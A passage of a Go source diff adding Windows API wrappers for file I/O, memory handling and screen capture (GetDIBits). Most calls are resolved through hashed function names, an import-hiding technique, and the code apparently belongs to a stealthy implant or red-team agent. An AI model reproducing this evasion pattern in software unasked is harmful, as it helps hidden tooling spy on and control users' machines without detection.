@@ -5,6 +5,18 @@ import (
 	"unsafe"
 )
 
+type BITMAPINFO struct {
+	BmiHeader BITMAPINFOHEADER
+	BmiColors *RGBQUAD
+}
+
+type RGBQUAD struct {
+	RgbBlue     byte
+	RgbGreen    byte
+	RgbRed      byte
+	RgbReserved byte
+}
+
 var (
 	kernel32                   = syscall.NewLazyDLL("kernel32.dll")
 	procCreateProcessW         = GetFunctionAddressbyHash("kernel32", 0xfbaf90cf)
@@ -20,23 +32,39 @@ var (
 	procDeleteDC 			   = GetFunctionAddressbyHash("Gdi32", 0xb2fa1ebf)
 	procReleaseDC 			   = GetFunctionAddressbyHash("User32", 0x6fbc050d)
 	procDeleteObject 		   = GetFunctionAddressbyHash("Gdi32", 0xe619cf2f)
-	procSetProcessDPIAware    = GetFunctionAddressbyHash("User32", 0xf96c94bd)
-	loadLibraryA = kernel32.NewProc("LoadLibraryA")
-	
+	procSetProcessDPIAware	   = GetFunctionAddressbyHash("User32", 0xf96c94bd)
+	procGetDIBits 			   = GetFunctionAddressbyHash("Gdi32", 0xd4676c24)
+	loadLibraryA               = kernel32.NewProc("LoadLibraryA")
+	procCreateFileW 		   = GetFunctionAddressbyHash("kernel32", 0x687d2110)
+	procWriteFile 			   = GetFunctionAddressbyHash("kernel32", 0xf1d207d0)
+	procReadFile 			   = GetFunctionAddressbyHash("kernel32", 0x84d15061)
+	procGetFileSize 		   = GetFunctionAddressbyHash("kernel32", 0x7b813820)
+	procGlobalAlloc			   = GetFunctionAddressbyHash("kernel32", 0x38379421)
+	procGlobalFree			   = GetFunctionAddressbyHash("kernel32", 0x47886698)
+	procGlobalLock			   = GetFunctionAddressbyHash("kernel32", 0x478ba3df)
+	procGlobalUnlock		   = GetFunctionAddressbyHash("kernel32", 0x6df57622)
 )
 
 const (
-	CREATE_NEW_CONSOLE = 0x00000010
-	CREATE_NO_WINDOW   = 0x08000000
-	PROCESS_ALL_ACCESS  = 0x1F0FFF
-	PROCESS_TERMINATE   = 0x0001
-	SM_XVIRTUALSCREEN   = 76
-	SM_YVIRTUALSCREEN   = 77
-	SM_CXVIRTUALSCREEN  = 78
-	SM_CYVIRTUALSCREEN  = 79
-	SRCCOPY			 = 0x00CC0020
-	DIB_RGB_COLORS 	 = 0
-	BI_RGB			 = 0	
+	CREATE_NEW_CONSOLE		= 0x00000010
+	CREATE_NO_WINDOW		= 0x08000000
+	PROCESS_ALL_ACCESS  	= 0x1F0FFF
+	PROCESS_TERMINATE   	= 0x0001
+	SM_XVIRTUALSCREEN   	= 76
+	SM_YVIRTUALSCREEN   	= 77
+	SM_CXVIRTUALSCREEN  	= 78
+	SM_CYVIRTUALSCREEN  	= 79
+	SRCCOPY        = 0x00CC0020
+	GENERIC_WRITE 			= 0x40000000
+	GENERIC_READ 			= 0x80000000
+	CREATE_ALWAYS 			= 2
+	OPEN_EXISTING 			= 3
+	OPEN_ALWAYS				= 4
+	FILE_ATTRIBUTE_NORMAL	= 0x80
+	BI_RGB 					= 0
+	DIB_RGB_COLORS 			= 0
+	GMEM_MOVEABLE 			= 0x0002
+
 )
 
 func CreateProcessW(appName *uint16, cmdLine *uint16, procAttrs *syscall.SecurityAttributes, threadAttrs *syscall.SecurityAttributes, inheritHandles bool, creationFlags uint32, env *uint16, currentDir *uint16, startupInfo *syscall.StartupInfo, procInfo *syscall.ProcessInformation) (bool, error) {
@@ -226,6 +254,135 @@ func DeleteObject(hObject syscall.Handle) (bool, error) {
 
 func SetProcessDPIAware() (bool, error) {
 	r1, _, e1 := syscall.SyscallN(procSetProcessDPIAware)
+	if r1 == 0 {
+		if e1 != 0 {
+			return false, syscall.Errno(e1)
+		}
+		return false, syscall.EINVAL
+	}
+	return true, nil
+}
+
+func CreateFile (fileName *uint16, desiredAccess uint32, shareMode uint32, securityAttributes *syscall.SecurityAttributes, creationDisposition uint32, flagsAndAttributes uint32, templateFile syscall.Handle) (syscall.Handle, error) {
+	r1, _, e1 := syscall.SyscallN(procCreateFileW,
+		uintptr(unsafe.Pointer(fileName)),
+		uintptr(desiredAccess),
+		uintptr(shareMode),
+		uintptr(unsafe.Pointer(securityAttributes)),
+		uintptr(creationDisposition),
+		uintptr(flagsAndAttributes),
+		uintptr(templateFile),
+	)
+	if r1 == 0 {
+		return 0, e1
+	}
+	return syscall.Handle(r1), nil
+}
+
+func WriteFile (handle syscall.Handle, buffer *byte, numberOfBytesToWrite uint32, numberOfBytesWritten *uint32, overlapped *syscall.Overlapped) (bool, error) {
+	r1, _, e1 := syscall.SyscallN(procWriteFile,
+		uintptr(handle),
+		uintptr(unsafe.Pointer(buffer)),
+		uintptr(numberOfBytesToWrite),
+		uintptr(unsafe.Pointer(numberOfBytesWritten)),
+		uintptr(unsafe.Pointer(overlapped)),
+	)
+	if r1 == 0 {
+		if e1 != 0 {
+			return false, syscall.Errno(e1)
+		}
+		return false, syscall.EINVAL
+	}
+	return true, nil
+}
+
+func ReadFile (handle syscall.Handle, buffer *byte, numberOfBytesToRead uint32, numberOfBytesRead *uint32, overlapped *syscall.Overlapped) (bool, error) {
+	r1, _, e1 := syscall.SyscallN(procReadFile,
+		uintptr(handle),
+		uintptr(unsafe.Pointer(buffer)),
+		uintptr(numberOfBytesToRead),
+		uintptr(unsafe.Pointer(numberOfBytesRead)),
+		uintptr(unsafe.Pointer(overlapped)),
+	)
+	if r1 == 0 {
+		if e1 != 0 {
+			return false, syscall.Errno(e1)
+		}
+		return false, syscall.EINVAL
+	}
+	return true, nil
+}
+
+func GetFileSize (handle syscall.Handle, fileSizeHigh *uint32) (uint32, error) {
+	r1, _, e1 := syscall.SyscallN(procGetFileSize,
+		uintptr(handle),
+		uintptr(unsafe.Pointer(fileSizeHigh)),
+	)
+	if r1 == 0xFFFFFFFF {
+		if e1 != 0 {
+			return 0, syscall.Errno(e1)
+		}
+		return 0, syscall.EINVAL
+	}
+	return uint32(r1), nil
+}
+
+func GetDIBits (hdc syscall.Handle, hbitmap syscall.Handle, startScan, numScans uint32, bits *byte, info *BITMAPINFO, colorUse uint32) (int32, error) {
+	r1, _, e1 := syscall.SyscallN(procGetDIBits,
+		uintptr(hdc),
+		uintptr(hbitmap),
+		uintptr(startScan),
+		uintptr(numScans),
+		uintptr(unsafe.Pointer(bits)),
+		uintptr(unsafe.Pointer(info)),
+		uintptr(colorUse),
+	)
+	if r1 == 0 {
+		if e1 != 0 {
+			return -100, syscall.Errno(e1)
+		}
+	}
+	return int32(r1), nil
+}
+
+func GlobalAlloc (flags uint32, bytes uintptr) (syscall.Handle, error) {
+	r1, _, e1 := syscall.SyscallN(procGlobalAlloc,
+		uintptr(flags),
+		uintptr(bytes),
+	)
+	if r1 == 0 {
+		return 0, e1
+	}
+	return syscall.Handle(r1), nil
+}
+
+func GlobalFree (hmem syscall.Handle) (bool, error) {
+	r1, _, e1 := syscall.SyscallN(procGlobalFree,
+		uintptr(hmem),
+	)
+	if r1 == 0 {
+		if e1 != 0 {
+			return false, syscall.Errno(e1)
+		}
+		return false, syscall.EINVAL
+	}
+	return true, nil
+}
+
+func GlobalLock (hmem syscall.Handle) (uintptr, error) {
+	r1, _, e1 := syscall.SyscallN(procGlobalLock,
+		uintptr(hmem),
+	)
+	if r1 == 0 {
+		return 0, e1
+	}
+	return uintptr(r1), nil
+}
+
+func GlobalUnlock (hmem syscall.Handle) (bool, error) {
+	r1, _, e1 := syscall.SyscallN(procGlobalUnlock,
+		uintptr(hmem),
+	)
 	if r1 == 0 {
 		if e1 != 0 {
 			return false, syscall.Errno(e1)
